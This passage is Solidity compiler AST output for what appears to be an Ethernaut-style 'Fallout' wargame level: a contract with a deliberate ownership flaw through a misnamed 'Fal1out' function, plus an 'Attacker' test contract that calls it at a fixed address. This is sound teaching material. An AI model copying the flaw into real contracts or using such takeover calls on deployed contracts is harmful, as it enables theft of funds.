															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 217,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 336,
																	"src": "532:3:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 218,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "532:10:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"id": 219,
																"name": "owner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 198,
																"src": "546:5:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"src": "532:19:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "63616c6c6572206973206e6f7420746865206f776e6572",
															"id": 221,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "566:25:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_98821890c044d63947a93cf48b7df1f5a42f89e719dd7abbb581002b013b02f4",
																"typeString": "literal_string \"caller is not the owner\""
															},
															"value": "caller is not the owner"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_98821890c044d63947a93cf48b7df1f5a42f89e719dd7abbb581002b013b02f4",
																"typeString": "literal_string \"caller is not the owner\""
															}
														],
														"id": 216,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															339,
															340
														],
														"referencedDeclaration": 340,
														"src": "510:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 222,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "510:92:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 223,
												"nodeType": "ExpressionStatement",
												"src": "510:92:1"
											},
											{
												"id": 224,
												"nodeType": "PlaceholderStatement",
												"src": "613:1:1"
											}
										]
									},
									"documentation": null,
									"id": 226,
									"name": "onlyOwner",
									"nodeType": "ModifierDefinition",
									"overrides": null,
									"parameters": {
										"id": 215,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "499:0:1"
									},
									"src": "480:142:1",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 243,
										"nodeType": "Block",
										"src": "661:75:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 241,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 229,
															"name": "allocations",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 196,
															"src": "667:11:1",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 232,
														"indexExpression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 230,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 336,
																"src": "679:3:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 231,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "679:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "667:23:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 238,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 336,
																	"src": "721:3:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 239,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "value",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "721:9:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 233,
																	"name": "allocations",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 196,
																	"src": "693:11:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 236,
																"indexExpression": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 234,
																		"name": "msg",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 336,
																		"src": "705:3:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_magic_message",
																			"typeString": "msg"
																		}
																	},
																	"id": 235,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "sender",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": null,
																	"src": "705:10:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address_payable",
																		"typeString": "address payable"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "693:23:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 237,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 26,
															"src": "693:27:1",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 240,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "693:38:1",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "667:64:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 242,
												"nodeType": "ExpressionStatement",
												"src": "667:64:1"
											}
										]
									},
									"documentation": null,
									"functionSelector": "abaa9916",
									"id": 244,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "allocate",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 227,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "643:2:1"
									},
									"returnParameters": {
										"id": 228,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "661:0:1"
									},
									"scope": 297,
									"src": "626:110:1",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 265,
										"nodeType": "Block",
										"src": "798:94:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 254,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 250,
																	"name": "allocations",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 196,
																	"src": "812:11:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 252,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 251,
																	"name": "allocator",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 246,
																	"src": "824:9:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address_payable",
																		"typeString": "address payable"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "812:22:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 253,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "837:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "812:26:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 249,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															339,
															340
														],
														"referencedDeclaration": 339,
														"src": "804:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 255,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "804:35:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 256,
												"nodeType": "ExpressionStatement",
												"src": "804:35:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"baseExpression": {
																"argumentTypes": null,
																"id": 260,
																"name": "allocations",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 196,
																"src": "864:11:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																	"typeString": "mapping(address => uint256)"
																}
															},
															"id": 262,
															"indexExpression": {
																"argumentTypes": null,
																"id": 261,
																"name": "allocator",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 246,
																"src": "876:9:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"isConstant": false,
															"isLValue": true,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "IndexAccess",
															"src": "864:22:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 257,
															"name": "allocator",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 246,
															"src": "845:9:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 259,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "845:18:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 263,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "845:42:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 264,
												"nodeType": "ExpressionStatement",
												"src": "845:42:1"
											}
										]
									},
									"documentation": null,
									"functionSelector": "a2dea26f",
									"id": 266,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sendAllocation",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 247,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 246,
												"name": "allocator",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 266,
												"src": "764:25:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address_payable",
													"typeString": "address payable"
												},
												"typeName": {
													"id": 245,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "764:15:1",
													"stateMutability": "payable",
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "763:27:1"
									},
									"returnParameters": {
										"id": 248,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "798:0:1"
									},
									"scope": 297,
									"src": "740:152:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 283,
										"nodeType": "Block",
										"src": "943:53:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 278,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 352,
																		"src": "977:4:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_Fallout_$297",
																			"typeString": "contract Fallout"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_Fallout_$297",
																			"typeString": "contract Fallout"
																		}
																	],
																	"id": 277,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "969:7:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 276,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "969:7:1",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 279,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "969:13:1",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"id": 280,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "balance",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "969:21:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 271,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 336,
																"src": "949:3:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 274,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "949:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 275,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "949:19:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 281,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "949:42:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 282,
												"nodeType": "ExpressionStatement",
												"src": "949:42:1"
											}
										]
									},
									"documentation": null,
									"functionSelector": "8aa96f38",
									"id": 284,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 269,
											"modifierName": {
												"argumentTypes": null,
												"id": 268,
												"name": "onlyOwner",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 226,
												"src": "933:9:1",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "933:9:1"
										}
									],
									"name": "collectAllocations",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 267,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "923:2:1"
									},
									"returnParameters": {
										"id": 270,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "943:0:1"
									},
									"scope": 297,
									"src": "896:100:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 295,
										"nodeType": "Block",
										"src": "1072:40:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"baseExpression": {
														"argumentTypes": null,
														"id": 291,
														"name": "allocations",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 196,
														"src": "1085:11:1",
														"typeDescriptions": {
															"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
															"typeString": "mapping(address => uint256)"
														}
													},
													"id": 293,
													"indexExpression": {
														"argumentTypes": null,
														"id": 292,
														"name": "allocator",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 286,
														"src": "1097:9:1",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "IndexAccess",
													"src": "1085:22:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 290,
												"id": 294,
												"nodeType": "Return",
												"src": "1078:29:1"
											}
										]
									},
									"documentation": null,
									"functionSelector": "ffd40b56",
									"id": 296,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "allocatorBalance",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 287,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 286,
												"name": "allocator",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 296,
												"src": "1026:17:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 285,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1026:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1025:19:1"
									},
									"returnParameters": {
										"id": 290,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 289,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 296,
												"src": "1066:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 288,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "1066:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1065:6:1"
									},
									"scope": 297,
									"src": "1000:112:1",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 298,
							"src": "228:886:1"
						}
					],
					"src": "32:1082:1"
				},
				"id": 1
			},
			"tests/test02.sol": {
				"ast": {
					"absolutePath": "tests/test02.sol",
					"exportedSymbols": {
						"Attacker": [
							321
						]
					},
					"id": 322,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 299,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "31:23:2"
						},
						{
							"absolutePath": "src/level02.sol",
							"file": "../src/level02.sol",
							"id": 300,
							"nodeType": "ImportDirective",
							"scope": 322,
							"sourceUnit": 298,
							"src": "56:28:2",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 321,
							"linearizedBaseContracts": [
								321
							],
							"name": "Attacker",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 311,
									"name": "level02",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 321,
									"src": "110:87:2",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_Fallout_$297",
										"typeString": "contract Fallout"
									},
									"typeName": {
										"contractScope": null,
										"id": 301,
										"name": "Fallout",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 297,
										"src": "110:7:2",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_Fallout_$297",
											"typeString": "contract Fallout"
										}
									},
									"value": {
										"argumentTypes": null,
										"arguments": [
											{
												"argumentTypes": null,
												"arguments": [
													{
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"hexValue": "307863333739623736656530374164333766363631444644616134303032446635453065463232643943",
																"id": 307,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "152:42:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																},
																"value": "0xc379b76ee07Ad37f661DFDaa4002Df5E0eF22d9C"
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															],
															"id": 306,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "144:7:2",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_address_$",
																"typeString": "type(address)"
															},
															"typeName": {
																"id": 305,
																"name": "address",
																"nodeType": "ElementaryTypeName",
																"src": "144:7:2",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 308,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "144:51:2",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													}
												],
												"expression": {
													"argumentTypes": [
														{
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													],
													"id": 304,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"lValueRequested": false,
													"nodeType": "ElementaryTypeNameExpression",
													"src": "136:8:2",
													"typeDescriptions": {
														"typeIdentifier": "t_type$_t_address_payable_$",
														"typeString": "type(address payable)"
													},
													"typeName": {
														"id": 303,
														"name": "address",
														"nodeType": "ElementaryTypeName",
														"src": "136:8:2",
														"stateMutability": "payable",
														"typeDescriptions": {
															"typeIdentifier": null,
															"typeString": null
														}
													}
												},
												"id": 309,
												"isConstant": false,
												"isLValue": false,
												"isPure": true,
												"kind": "typeConversion",
												"lValueRequested": false,
												"names": [],
												"nodeType": "FunctionCall",
												"src": "136:60:2",
												"tryCall": false,
												"typeDescriptions": {
													"typeIdentifier": "t_address_payable",
													"typeString": "address payable"
												}
											}
										],
										"expression": {
											"argumentTypes": [
												{
													"typeIdentifier": "t_address_payable",
													"typeString": "address payable"
												}
											],
											"id": 302,
											"name": "Fallout",
											"nodeType": "Identifier",
											"overloadedDeclarations": [],
											"referencedDeclaration": 297,
											"src": "128:7:2",
											"typeDescriptions": {
												"typeIdentifier": "t_type$_t_contract$_Fallout_$297_$",
												"typeString": "type(contract Fallout)"
											}
										},
										"id": 310,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "typeConversion",
										"lValueRequested": false,
										"names": [],
										"nodeType": "FunctionCall",
										"src": "128:69:2",
										"tryCall": false,
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_Fallout_$297",
											"typeString": "contract Fallout"
										}
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 319,
										"nodeType": "Block",
										"src": "233:34:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"expression": {
															"argumentTypes": null,
															"id": 314,
															"name": "level02",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 311,
															"src": "243:7:2",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_Fallout_$297",
																"typeString": "contract Fallout"
															}
														},
														"id": 316,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "Fal1out",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 214,
														"src": "243:15:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_payable$__$returns$__$",
															"typeString": "function () payable external"
														}
													},
													"id": 317,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "243:17:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 318,
												"nodeType": "ExpressionStatement",
												"src": "243:17:2"
											}
										]
									},
									"documentation": null,
									"functionSelector": "f8a8fd6d",
									"id": 320,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "test",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 312,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "217:2:2"
									},
									"returnParameters": {
										"id": 313,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "233:0:2"
									},
									"scope": 321,
									"src": "204:63:2",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 322,
							"src": "86:183:2"
						}
					],
					"src": "31:238:2"
				},
				"id": 2
			}
		}
	}
}